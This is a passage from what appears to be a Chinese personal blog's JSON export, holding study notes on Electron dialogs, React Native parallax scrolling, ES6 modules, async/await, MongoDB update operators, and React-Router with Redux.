将异步调用 API ，并且结果将用过 callback(filenames) 展示。 dialog.showMessageBox([browserWindow, ]options[, callback]) browserWindow BrowserWindow (可选) options Object (必须) type String - 可以是 “none”, “info”, “error”, “question” 或 “warning”. 在 Windows, “question” 与 “info” 展示图标相同, 除非你使用 “icon” 参数. buttons Array - buttons 内容，数组. defaultId Integer - 在message box 对话框打开的时候，设置默认button选中，值为在 buttons 数组中的button索引. title String - message box 的标题，一些平台不显示. message String - message box 内容. detail String - 额外信息. icon NativeImage cancelId Integer - 当用户关闭对话框的时候，不是通过点击对话框的button，就返回值.默认值为对应 “cancel” 或 “no” 标签button 的索引值, 或者如果没有这种button，就返回0. 在 macOS 和 Windows 上， “Cancel” button 的索引值将一直是 cancelId, 不管之前是不是特别指出的. noLink Boolean - 在 Windows ，Electron 将尝试识别哪个button 是普通 button (如 “Cancel” 或 “Yes”), 然后再对话框中以链接命令(command links)方式展现其它的 button . 这能让对话框展示得很炫酷.如果你不喜欢这种效果，你可以设置 noLink 为 true. callback Function 展示 message box, 它会阻塞进程，直到 message box 关闭为止.返回点击按钮的索引值. dialog.showErrorBox(title, content) 展示一个传统的包含错误信息的对话框. 在 app 模块触发 ready 事件之前，这个 api 可以被安全调用，通常它被用来在启动的早期阶段报告错误. 在 Linux 上，如果在 app 模块触发 ready 事件之前调用，message 将会被触发显示stderr，并且没有实际GUI 框显示. 在渲染线程使用上面说了dialog只能在主线程上使用。那么如何在渲染线程上使用呢？那么就要使用remote进行通信。 remote 模块提供了一种在渲染进程（网页）和主进程之间进行进程间通讯（IPC）的简便途径。 使用示例： 123456789101112131415161718const remote = require('electron').remote;const dialog = remote.dialog;setTimeout(() =&gt; &#123; // 打开对话框 dialog.showOpenDialog(&#123; title: 'Lizhooh', properties: ['openFile'], filters: [ &#123; name: 'Images', extensions: ['jpg', 'png', 'gif'] &#125;, &#123; name: 'Movies', extensions: ['mkv', 'avi', 'mp4'] &#125;, &#123; name: 'Custom File Type', extensions: ['as'] &#125;, &#123; name: 'All Files', extensions: ['*'] &#125; ] &#125;, (filenames =&gt; &#123; console.log(filenames); &#125;));&#125;, 1000); 参考资料 http://electron.ebookchain.org/zh-CN/api/dialog.html","categories":[{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/categories/Electron/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/tags/Electron/"}]},{"title":"React Native 滚动视觉差","slug":"React Native/React Native 滚动视觉差","date":"2017-03-18T13:24:37.000Z","updated":"2021-06-15T06:10:52.864Z","comments":true,"path":"/stories/2017/03/React Native/React Native 滚动视觉差/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/React Native/React Native 滚动视觉差/","excerpt":"前言滚动视觉差是一个很好的用户体验设计，在 React Native 要实现滚动视觉差主要是通过动画 API 与手势 API 来实现。在 Github 上已经有很多实现了库可以使用，这里介绍一个滚动视觉差库的使用。","text":"前言滚动视觉差是一个很好的用户体验设计，在 React Native 要实现滚动视觉差主要是通过动画 API 与手势 API 来实现。在 Github 上已经有很多实现了库可以使用，这里介绍一个滚动视觉差库的使用。 滚动视觉差滚动视觉差使用的是 react-native-parallax-scroll 这个，它可以轻易的实现上图的效果。 123456789101112131415161718192021222324252627&lt;ParallaxScroll ref=&#123;s =&gt; this.scrollView = s&#125; style=&#123;&#123; flex: 1 &#125;&#125; overScrollMode='never' showsVerticalScrollIndicator=&#123;false&#125; showsHorizontalScrollIndicator=&#123;false&#125; // 上面是 scrollview 的 props // 头部 renderHeader=&#123;(&#123; animatedValue &#125;) =&gt; this.renderTopbar(data, id)&#125; // 头高度 headerHeight=&#123;40 + 25&#125; // 是否是悬浮 isHeaderFixed=&#123;true&#125; // 视觉差高度 parallaxHeight=&#123;240&#125; // 头部背景颜色 headerBackgroundColor='transparent' // 头部浮动之后的背景颜色 headerFixedBackgroundColor='#fff' // 视觉差背景内容 renderParallaxBackground=&#123;(&#123; animatedValue &#125;) =&gt; this.renderImage(titleImage)&#125; // 前景内容 &gt; &#123;/* 这里是内容区 */&#125; &#123;this.renderBody(data)&#125;&lt;/ParallaxScroll&gt; APIParallaxScroll 支持所有的 ScrollView，可以把它充当一个 ScrollView 来使用，但不建议充当 ListView。 Property Type Defaut Description style object {} 样式。 width number window.width 宽度。 height number window.height 高度。 innerRef func null 获取引用。 scrollStyle object {} ScrollView 上的样式。 headerHeight number 45 浮动头部的高度。 renderHeader ({ width, height, animatedValue }) =&gt; {} null 浮动头部的内容。 onHeaderFixed func null 当标题将附加到顶部时调用。 isHeaderFixed bool false 标题是否固定在顶部（不粘）？ parallaxHeight number window.width * 9 / 16 视差的高度。 useNativeDriver bool false 是否使用原生动画，仅适用于 Animated.ScrollView 组件。 scrollableComponent class Animated.ScrollView 可滚动的组件。 isBackgroundScalable bool true iOS 上的后台可扩展吗？ headerBackgroundColor string rgba(0, 0, 0, 0) 头部的背景颜色。 contentContainerStyle object {} 滚动视图内容容器颜色。 headerFixedTransformY number 0 此数字表示在滚动期间固定标题应向上移动多少。 onChangeHeaderVisibility func null 隐藏或显示视差标头时（当用户滚动时）调用的回调函数。 renderParallaxBackground ({ width, height, animatedValue }) =&gt; {} null 视差的背景。 renderBackgroundPlaceholder ({ height, animatedValue }) =&gt; {} null 我们在 parallaxHeight 的高度前面添加一个空视图。 您可以覆盖此行为以在前景和背景之间对事物进行分层。 renderParallaxForeground ({ width, height, animatedValue }) =&gt; {} null 视差的前景。 fadeOutParallaxBackground bool false 如果为 true，则当用户向上滚动时背景会淡出。 fadeOutParallaxForeground bool false 如果为 true，则当用户向上滚动时前景会淡出。 headerFixedBackgroundColor string rgba(0, 0, 0, 1) 浮动头部的背景颜色。 backgroundScale number 3 背景缩放的速度因子。 backgroundScaleOrigin center or top center 背景应滚动的点。 parallaxBackgroundScrollSpeed number 5 背景相对于滚动内容移动的速度因子。 parallaxForegroundScrollSpeed number 5 前景相对于滚动内容移动的速度因子。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"ES6 Module 模块机制","slug":"ECMAScript/ES6 Module 模块机制","date":"2017-03-18T07:31:14.000Z","updated":"2021-06-15T06:10:52.810Z","comments":true,"path":"/stories/2017/03/ECMAScript/ES6 Module 模块机制/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/ECMAScript/ES6 Module 模块机制/","excerpt":"前言在 ES6 之前，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 两种。前者用于服务器，后者用于浏览器。ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。 import 与 export在 ES6 里使用import, export来管理模块。export命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。","text":"前言在 ES6 之前，社区制定了一些模块加载方案，最主要的有 CommonJS 和 AMD 两种。前者用于服务器，后者用于浏览器。ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案。 import 与 export在 ES6 里使用import, export来管理模块。export命令用于规定模块的对外接口，import命令用于输入其他模块提供的功能。 export 语法一个模块就是一个独立的文件。该文件内部的所有变量，外部无法获取。如果你希望外部能够读取模块内部的某个变量，就必须使用export关键字输出该变量。 1234// profile.jsexport var firstName = 'Michael';export var lastName = 'Jackson';export var year = 1958; 使用对象解构的写法12345678910// profile.jsvar firstName = 'Michael';var lastName = 'Jackson';var year = 1958;export &#123; firstName, lastName, year&#125;; 输出函数或类（class）1234567export function multiply(x, y) &#123; return x * y;&#125;;export class A extends B &#123; //...&#125;; 使用 as 重命名123456789101112function multiply(x, y) &#123; return x * y;&#125;;class A extends B &#123; //...&#125;;export &#123; multiply as m, A as a,&#125;; 错误的写法export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。 错误写法 12345678910// 报错export 1;// 报错var m = 1;export m;// 报错function f() &#123;&#125;export f; 正确写法 1234567891011121314151617// 写法一export var m = 1;// 写法二var m = 1;export &#123;m&#125;;// 写法三var n = 1;export &#123;n as m&#125;;// 正确export function f() &#123;&#125;;// 正确function f() &#123;&#125;export &#123;f&#125;; 动态绑定关系export语句输出的接口，与其对应的值是动态绑定关系，即通过该接口，可以取到模块内部实时的值。下面代码输出变量 foo，值为 bar，500 毫秒之后变成 baz。 12export var foo = 'bar';setTimeout(() =&gt; foo = 'baz', 500); 出现位置export命令可以出现在模块的任何位置，只要处于模块顶层就可以。如果处于块级作用域内，就会报错。 import 语法可以通过import命令加载export导出的模块。 12// main.jsimport &#123;firstName, lastName, year&#125; from './profile'; 使用 as 重命名1import &#123; lastName as surname &#125; from './profile'; 提升效果import命令具有提升效果，会提升到整个模块的头部，首先执行。 123foo();import &#123; foo &#125; from 'my_module'; 静态执行由于import是静态执行，所以不能使用表达式和变量，这些只有在运行时才能得到结果的语法结构。 1234567891011121314// 报错import &#123; 'f' + 'oo' &#125; from 'my_module';// 报错let module = 'my_module';import &#123; foo &#125; from module;// 报错if (x === 1) &#123; import &#123; foo &#125; from 'module1';&#125;else &#123; import &#123; foo &#125; from 'module2';&#125; 省略 from省略from，import语句会执行所加载的模块。下面代码仅仅执行lodash模块，但是不输入任何值。 1import 'lodash'; 重复执行如果多次重复执行同一句import语句，那么只会执行一次，而不会执行多次。 123456789import 'lodash';import 'lodash';// 只执行一次 lodashimport &#123; foo &#125; from 'my_module';import &#123; bar &#125; from 'my_module';// 等同于import &#123; foo, bar &#125; from 'my_module'; 配合默认加载当模块里使用了export和export default时，可以使用,来表明，不同的加载。 1234import lodash, &#123; each &#125; from 'lodash';// 下面是错误的import &#123; map &#125;, &#123; each &#125; from 'lodash'; 整体加载假如模块里export var a = 1; export var b = 2 12345import &#123; a, b &#125; from 'my_module';// 或者import * as all from 'my_module';// all.a, all.b export default 语法export default命令，为模块指定默认输出。 1234// export-default.jsexport default function () &#123; console.log('foo');&#125; 123456// import-default.jsimport customName from './export-default';customName(); // 'foo'// 或者import &#123; customName &#125; from './export-default'; export default命令用于指定模块的默认输出。显然，一个模块只能有一个默认输出，因此export default命令只能使用一次。所以，import命令后面才不用加大括号，因为只可能对应一个方法。 本质上，export default就是输出一个叫做default的变量或方法，然后系统允许你为它取任意名字，如果你没有取名称，那么它导出就是叫default。 123456789101112131415161718// 正确export var a = 1;// 正确var a = 1;export default a;// 错误export default var a = 1;// 错误export default a = 1;// 正确export default 42;// 报错export 42; export 与 import 的复合写法如果在一个模块之中，先输入后输出同一个模块，import语句可以与export语句写在一起。 1234567891011121314export &#123; foo, bar &#125; from 'my_module';// 等同于import &#123; foo, bar &#125; from 'my_module';export &#123; foo, bar &#125;;// 接口改名export &#123; foo as myFoo &#125; from 'my_module';// 整体输出export * from 'my_module';// 默认模块export &#123; default as other &#125; from 'foo'; 参考资料 http://es6.ruanyifeng.com/#docs/module","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"ES7 Async，Await 异步编程","slug":"ECMAScript/ES7 Async，Await 异步编程","date":"2017-03-18T04:47:45.000Z","updated":"2021-06-15T06:10:52.812Z","comments":true,"path":"/stories/2017/03/ECMAScript/ES7 Async，Await 异步编程/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/ECMAScript/ES7 Async，Await 异步编程/","excerpt":"异步编程异步操作是 JavaScript 编程的麻烦事，麻烦到一直有人提出各种各样的方案，试图解决这个问题。 一开始是通过回调函数的方式，到后来Promise对象，再到Generator的特技，到最后在 ES7 的草案上的Async，Await。 而async函数就是隧道尽头的亮光，很多人认为它是异步操作的终极解决方案。（可能在未来还有更好的方案)","text":"异步编程异步操作是 JavaScript 编程的麻烦事，麻烦到一直有人提出各种各样的方案，试图解决这个问题。 一开始是通过回调函数的方式，到后来Promise对象，再到Generator的特技，到最后在 ES7 的草案上的Async，Await。 而async函数就是隧道尽头的亮光，很多人认为它是异步操作的终极解决方案。（可能在未来还有更好的方案) Async 是什么？一句话，async 函数就是 Generator 函数的语法糖。 下面是使用 Generator 来控制异步流程的： 12345678910111213141516var fs = require('fs');var readFile = function (fileName) &#123; return new Promise(function (resolve, reject) &#123; fs.readFile(fileName, function(error, data) &#123; error ? reject(error) : resolve(data); &#125;); &#125;);&#125;;var gen = function* () &#123; var f1 = yield readFile('/etc/fstab'); var f2 = yield readFile('/etc/shells'); console.log(f1.toString()); console.log(f2.toString());&#125;; 写成 async 函数，就是下面这样： 123456var asyncReadFile = async function ()&#123; var f1 = await readFile('/etc/fstab'); var f2 = await readFile('/etc/shells'); console.log(f1.toString()); console.log(f2.toString());&#125;; 一比较就会发现，async 函数就是将 Generator 函数的星号（*）替换成 async，将 yield 替换成 await，仅此而已。 async 函数的优点async 函数对 Generator 函数的改进，体现在以下三点。 内置执行器。 Generator 函数的执行必须靠执行器，所以才有了 co 函数库，而 async 函数自带执行器。也就是说，async 函数的执行，与普通函数一模一样，只要一行。 更好的语义。 async 和 await，比起星号和 yield，语义更清楚了。async 表示函数里有异步操作，await 表示紧跟在后面的表达式需要等待结果。 更广的适用性。 co 函数库约定，yield 命令后面只能是 Thunk 函数或 Promise 对象，而 async 函数的 await 命令后面，可以跟 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。 async 函数的用法同 Generator 函数一样，async 函数返回一个 Promise 对象，可以使用 then 方法添加回调函数。当函数执行的时候，一旦遇到 await 就会先返回，等到触发的异步操作完成，再接着执行函数体内后面的语句。 123456789async function getStockPriceByName(name) &#123; var symbol = await getStockSymbol(name); var stockPrice = await getStockPrice(symbol); return stockPrice;&#125;getStockPriceByName('goog').then(function (result)&#123; console.log(result);&#125;); await 的用法await命令后面的 Promise 对象，运行结果可能是 rejected，所以最好把 await 命令放在 try…catch 代码块中。 如果await后面不是 Promise 对象，就会立即得到运行结果，这跟没有使用 await 是一样的。 await命令只能用在 async 函数之中，如果用在普通函数，就会报错。在迭代器函数里不要使用 await，这时应该使用for/while 12345678async function dbFuc(db) &#123; let docs = [&#123;&#125;, &#123;&#125;, &#123;&#125;]; // 可能得到错误结果 docs.forEach(async function (doc) &#123; await db.post(doc); &#125;);&#125; 如果确实希望多个请求并发执行，可以使用 Promise.all 方法。 1234567async function dbFuc(db) &#123; let docs = [&#123;&#125;, &#123;&#125;, &#123;&#125;]; let promises = docs.map((doc) =&gt; db.post(doc)); let results = await Promise.all(promises); console.log(results);&#125; 注意！避免太过循序尽管您编写的是看似同步的代码，也一定不要错失并行执行的机会。这里面有一些奇妙的变化。 12345async function series() &#123; await wait(500); await wait(500); return \"done!\";&#125; 以上代码执行完毕需要 1000 毫秒，再看看这段代码： 1234567async function parallel() &#123; const wait1 = wait(500); const wait2 = wait(500); await wait1; await wait2; return \"done!\";&#125; 它们写法有些不同，但是以上代码只需 500 毫秒就可执行完毕，因为两个 wait 是同时发生的。 不推荐的编码方式123456async function logInOrder(urls) &#123; for (const url of urls) &#123; const response = await fetch(url); console.log(await response.text()); &#125;&#125; 代码简洁得多，但我的第二次获取要等到第一次获取读取完毕才能开始，以此类推。其执行效率要比并行执行获取的 Promise 示例低得多。 幸运的是，还有一种理想的中庸之道： 123456789101112async function logInOrder(urls) &#123; // fetch all the URLs in parallel const textPromises = urls.map(async url =&gt; &#123; const response = await fetch(url); return response.text(); &#125;); // 并发执行，每个任务之间不会等待 for (const textPromise of textPromises) &#123; console.log(await textPromise); &#125;&#125; 示例用法使用Async，Await来进行以同步的方式编写异步流程的。 1234567891011121314151617181920const save = (filePath, data, encode = 'utf8') =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; fs.writeFile(filePath, data, encode, (err) =&gt; &#123; // return err ? reject(err) : resolve(); return err ? resolve(err) : resolve(true); &#125;); &#125;);&#125;;// 下面的代码看起来是同步的，实际上是异步进行的。async function other() &#123; // 获取数据 const data = await fetch('http://www.baidu.com').then(res =&gt; res.text()); // 保存文件 const file = await save('./baidu.txt', data); // 保存完成后做点其他事情 ... if(file === true) &#123; console.log('success'); &#125;&#125; 参考资料 http://www.ruanyifeng.com/blog/2015/05/async.html","categories":[{"name":"ES6","slug":"ES6","permalink":"http://me.lizhooh.com/categories/ES6/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"ES6(ES2015)","slug":"ES6-ES2015","permalink":"http://me.lizhooh.com/tags/ES6-ES2015/"}]},{"title":"MongoDB 更新文档（Update）","slug":"MongoDB/MongoDB 更新文档（Update）","date":"2017-03-15T15:06:05.000Z","updated":"2021-06-15T06:10:52.827Z","comments":true,"path":"/stories/2017/03/MongoDB/MongoDB 更新文档（Update）/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/MongoDB/MongoDB 更新文档（Update）/","excerpt":"更新文档在 MongoDB 中更新文档的操作还是挺灵活的。 updateupdate 是最常用的更新文档操作，它的 API 形式是： 12345678910db.collection.update( &lt;query&gt;, /* 查询语句 */ &lt;update&gt;, /* 更新内容 */ &#123; /* 更新的特性选项 */ [upsert]: &lt;boolean&gt;, /* true: 若匹配项不存在，则创建， false: 不创建*/ [multi]: &lt;boolean&gt;, /* true: 全部匹配项更新, false: 只更新匹配第一个 */ [writeConcern]: &lt;document&gt; &#125;)/* 加 [] 表示是可选的参数 */","text":"更新文档在 MongoDB 中更新文档的操作还是挺灵活的。 updateupdate 是最常用的更新文档操作，它的 API 形式是： 12345678910db.collection.update( &lt;query&gt;, /* 查询语句 */ &lt;update&gt;, /* 更新内容 */ &#123; /* 更新的特性选项 */ [upsert]: &lt;boolean&gt;, /* true: 若匹配项不存在，则创建， false: 不创建*/ [multi]: &lt;boolean&gt;, /* true: 全部匹配项更新, false: 只更新匹配第一个 */ [writeConcern]: &lt;document&gt; &#125;)/* 加 [] 表示是可选的参数 */ 例子： 1234db.people.update( &#123; name: 'xiao' &#125;, &#123; name: 'xiaoming' &#125;); 这个只会更新第一个匹配的项，如果有多个name=&#39;xiao&#39;，想要全部都更新成name=&#39;xiaoming&#39;，就要使用multi:true 12345db.people.update( &#123; name: 'xiao' &#125;, &#123; name: 'xiaoming' &#125;, &#123; multi: true &#125;); 如果想要得到 “文档不存在时，创建；文档存在时，更新”，就要使用upsert:true 12345db.people.update( &#123; name: 'xiao' &#125;, &#123; name: 'xiaoming' &#125;, &#123; upsert: true &#125;); updateOneupdateOne 是 3.2 版本添加的新函数，它主要的功能是更新一条信息，它的 API 12345678db.collection.updateOne( &lt;query&gt;, /* 查询语句 */ &lt;update&gt;, /* 更新内容 */ &#123; [upsert]: &lt;boolean&gt;, /* true: 若匹配项不存在，则创建， false: 不创建*/ [writeConcern]: &lt;document&gt; &#125;) 与update不同的是，它没有multi updateManyupdateMany 是 3.2 版本添加的新函数，它支持一次性更新多条数据，它的 API 和 updateOne 一样 12345678db.collection.updateMany( &lt;query&gt;, /* 查询语句 */ &lt;update&gt;, /* 更新内容 */ &#123; [upsert]: &lt;boolean&gt;, /* true: 若匹配项不存在，则创建， false: 不创建*/ [writeConcern]: &lt;document&gt; &#125;) 例子： 1234db.people.updateMany( &#123;name:'xiaoming'&#125;, &#123;$set:&#123;name:'xiao'&#125;&#125;) 相当于update的multi设置为true replaceOnereplaceOne 是 3.2 版本添加的函数，它的作用是用新的文档替换旧的文档，它的 API 12345678db.collection.replaceOne( &lt;query&gt;, /* 查询语句 */ &lt;replacement&gt;, /* 替换内容 */ &#123; [upsert]: &lt;boolean&gt;, /* true: 若匹配项不存在，则创建， false: 不创建*/ [writeConcern]: &lt;document&gt; &#125;) 这个功能其实和 update 差不多 1234567891011121314var data = [ &#123; \"_id\" : 1, \"name\" : \"Central Perk Cafe\", \"violations\" : 3 &#125;, &#123; \"_id\" : 2, \"name\" : \"Rock A Feller Bar and Grill\",\"violations\" : 2 &#125;, &#123; \"_id\" : 3, \"name\" : \"Empire State Pub\", \"violations\" : 0 &#125;];db.people.insertMany(data);db.people.replaceOne( &#123; \"name\" : \"Central Perk Cafe\" &#125;, &#123; \"_id\": 1, \"name\" : \"Pizza Rat's Pizzaria\", \"violations\" : 8 &#125;);db.people.find(); 输出： 12345678910111213&#123; \"_id\": 1, \"name\": \"Pizza Rat's Pizzaria\", \"violations\": 8&#125;, &#123; \"_id\": 2, \"name\": \"Rock A Feller Bar and Grill\", \"violations\": 2&#125;, &#123; \"_id\": 3, \"name\": \"Empire State Puwb\", \"violations\": 0&#125; savesave 是 MongoDB 的辅助函数，它的作用是保存，没错就是“保存” 当文档不存在时会自动创建，如果存在会覆盖原来的文档。它的 API： 123456db.collection.save( &lt;document&gt;, /* 保存的文档 */ &#123; writeConcern: &lt; document &gt; &#125;) 这个功能相当与update设置upsert为true 例子： 123456789db.people.save(&#123;_id:4, name:'xiaohao'&#125;)db.people.find();/*&#123; \"_id\" : 4, \"name\" : \"xiaohao\"&#125;*/ 修饰符修饰符部分相当于 SQL 中的 Where 谓词，部分是 MongoDB 特有的。 Fields 字段 $inc 相当于 +=$mul 相当于 *= 1db.people.update(&#123; age: 20 &#125;, &#123; $inc: &#123; age: 3 &#125; &#125;) // age += 3 $rename 更改字段名称 1db.people.update(&#123; age: 20 &#125;, &#123; $rename: &#123; age: 'Age' &#125; &#125;) // age =&gt; Age $setOnInsert 当 update 方法使用 upsert 选项执行 insert 操作时，$setOnInsert 操作符给相应的字段赋值若 update 方法执行的 update 操作而不是 insert 操作，那么 $setOnInsert 操作符将无效 123db.people.update(&#123; _id: 1 &#125;, &#123; $setOnInsert: &#123; name: 'xiaoming' &#125; &#125;, &#123; upsert: true &#125;)// 相当于,文档中无_id=1时，执行db.people.insert(&#123; _id: 1, name: 'xiaoming' &#125;); $set 设置文档中一个字段的值 1db.people.update(&#123; age: 20 &#125;, &#123; $set: &#123; age: 30 &#125; &#125;) // age 20 =&gt; 30 $unset 从文档中删除指定的字段(属性) 在 MongoDB 里，数据的存储格式是 BSON 文档格式，类似 JSON。并不像 SQL 中的表那样要求数据字段一致。 12345db.products.update( &#123; sku: \"unknown\" &#125;, &#123; $unset: &#123; quantity: \"\", instock: \"\" &#125; &#125;);// 根据 sku 查询，删除两个字段。 $min 如果指定的值小于现有的字段值则更新字段的值$max 如果指定的值大于现有的字段值则更新字段的值 12db.people.update(&#123; age: 20 &#125;, &#123; $min: &#123; age: 19 &#125; &#125;) // 更新db.people.update(&#123; age: 20 &#125;, &#123; $min: &#123; age: 21 &#125; &#125;) // 不更新 $currentDate 将一个字段设置为日期类型，默认为 date 类型，可选择：date,timestamp 12345678910db.people.update( &#123; age: 10 &#125;, &#123; $currentDate: &#123; day1: true, day2: &#123; $type: \"timestamp\" &#125; &#125; &#125;)&#123; \"_id\" : 1, \"age\" : 10, \"day1\" : ISODate(\"2016-08-21T15:45:55.908Z\"), \"day2\" : Timestamp(1471794355, 1)&#125; Array 数组 $ 作为一个占位符来更新第一个元素相匹配的字段 1234567891011var data = [ &#123;\"_id\" : 1, \"grades\" : [ 80, 85, 90 ]&#125;, &#123;\"_id\" : 2, \"grades\" : [ 88, 90, 92 ]&#125;, &#123;\"_id\" : 3, \"grades\" : [ 85, 100, 90 ]&#125;]db.people.insertMany(data); // 整体插入db.people.update( &#123; _id: 1, grades: 80 &#125;, &#123; $set: &#123; \"grades.$\": 82 &#125; &#125;);// &#123; \"_id\" : 1, \"grades\" : [ 82, 85, 90 ] &#125; $addToSet 若字段为数组，向字段尾追加新值，除非它已经存在。如果字段不是数组，则操作将失败。 123456// &#123; _id: 1, letters: [\"a\", \"b\"] &#125;db.test.update( &#123; _id: 1 &#125;, &#123; $addToSet: &#123;letters: [ \"c\", \"d\" ] &#125; &#125;)// &#123; _id: 1, letters: [ \"a\", \"b\", [ \"c\", \"d\" ] ] &#125; $pop 若字段为数组，则向数组删除数据 1db.people.update(&#123; _id: 1 &#125;, &#123; $pop: &#123; grades: -1 &#125; &#125;) // -1：头部删除，1：尾部删除 $pullAll 从现有的所有实例数组删除指定的值 123// &#123;_id: 1, scores: [0, 2, 5, 5, 1, 0]&#125;db.survey.update(&#123; _id: 1 &#125;, &#123; $pullAll: &#123; scores: [0, 5] &#125; &#125;) // 删除 0 和 5// &#123;\"_id\": 1, \"scores\": [2, 1]&#125; $pull 删除所有数组元素匹配指定的查询。 123// &#123;_id: 1, scores: [0, 2, 5, 5, 1, 0]&#125;db.survey.update(&#123; _id: 1 &#125;, &#123; $pull: &#123; scores: 2 &#125; &#125;) // 删除 2// &#123;\"_id\": 1, \"scores\": [0, 5, 5, 1, 0]&#125; $push 若字段为数组，则向数组增加数据 1234567891011// 增加一个db.people.update( &#123; name: \"Aer\" &#125;, &#123; $push: &#123; scores: &#123; $each: 90 &#125; &#125; &#125;)// 增加多个db.people.update( &#123; name: \"Aer\" &#125;, &#123; $push: &#123; scores: &#123; $each: [90, 92, 85] &#125; &#125; &#125;) Modiflers $each 配合$push使用，遍历进行多个$push操作 1234db.students.update( &#123; name: \"joe\" &#125;, &#123; $push: &#123; scores: &#123; $each: [90, 92, 85] &#125; &#125; &#125;) $slice 能够限制数组的长度，相当于队列，超出的元素，将会把前面的挤出去。正数尾出，负数头出 123456//&#123;\"_id\": 1, \"scores\": [ 40, 50, 60 ]&#125;db.students.update(&#123; _id: 1 &#125;, &#123; $push: &#123; scores: &#123; $each: [80, 90, 100], $slice: -5 &#125; &#125; &#125;)// result//&#123;\"_id\": 1, \"scores\": [50, 60, 80, 90, 100]&#125; $sort 对数组进行排序, -1降序, 1升序 123456$push: &#123; &lt;field&gt;: &#123; $each: [ &lt;value1&gt;, &lt;value2&gt;, ... ], $sort: &lt;sort specification&gt; &#125;&#125; 1234567891011121314db.students.update( &#123; _id: 1 &#125;, &#123; $push: &#123; // 在 quizzes 字段里 quizzes: &#123; // 插入新的元素 $each: [ &#123; id: 3, score: 8 &#125;, &#123; id: 4, score: 7 &#125;, &#123; id: 5, score: 6 &#125; ], // 并且让所有的 score 进行升序排序 $sort: &#123; score: 1 &#125; &#125; &#125; &#125;) $position 用来指定 $push 所插入的位置 123456$push: &#123; &lt;field&gt;: &#123; $each: [ &lt;value1&gt;, &lt;value2&gt;, ... ], $position: &lt;num&gt; &#125;&#125; 1234567891011121314db.students.update( &#123; _id: 1 &#125;, &#123; $push: &#123; // 在 scores 字段里 scores: &#123; // 插入新元素 $each: [ 50, 60, 70 ], // 在 0 位置插入 $position: 0 &#125; &#125; &#125;) 参考资料 https://docs.mongodb.com/manual/tutorial/update-documents/","categories":[{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/categories/MongoDB/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"}]},{"title":"React-Router 结合 Redux","slug":"React/Router/React-Router 结合 Redux","date":"2017-03-13T08:34:32.000Z","updated":"2021-06-15T06:10:52.883Z","comments":true,"path":"/stories/2017/03/React/Router/React-Router 结合 Redux/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/React/Router/React-Router 结合 Redux/","excerpt":"前言React单独使用，并不难。React 与 React-Router 结合使用，可能会有点难度。React 与 React-Redux 结合使用，可能会有点难度。 但它们三者都结合在一起React, React-Router, Redux使用的时候，会感觉让人眼花缭乱。 (这里的 React-Router 指的是 4.0 版本)","text":"前言React单独使用，并不难。React 与 React-Router 结合使用，可能会有点难度。React 与 React-Redux 结合使用，可能会有点难度。 但它们三者都结合在一起React, React-Router, Redux使用的时候，会感觉让人眼花缭乱。 (这里的 React-Router 指的是 4.0 版本) 安装安装的东西可能有点多。(npm install) 1234567891011&#123; \"axios\": \"^0.15.3\", \"react\": \"^15.4.2\", \"react-dom\": \"^15.4.2\", \"react-redux\": \"^5.0.3\", \"react-router\": \"^4.0.0\", \"react-router-dom\": \"^4.0.0\", \"react-router-redux\": \"^4.0.8\", \"redux\": \"^3.6.0\", \"redux-thunk\": \"^2.2.0\"&#125; 步骤这肯定有一些步骤，主要是react -&gt; react-router -&gt; redux 先是写好 React 的组件，再是配置 React-Router 路由，最后在连接 Redux。 编写 React 组件假设写了这几个组件：Latest, Category, Search 这几个组件的结构都只是输出一些简单的文字。 12345export default (props) =&gt; ( &lt;div&gt; &lt;h1&gt;Search&lt;/h1&gt; &lt;/div&gt;); 配置 React-Router 路由再就是配置路由，这里只是简单的类似tabs的路由结构。 1234567891011121314151617181920212223242526272829import React from 'react';import &#123; BrowserRouter as Router, Route, Redirect,&#125; from 'react-router-dom';import &#123; Banner, 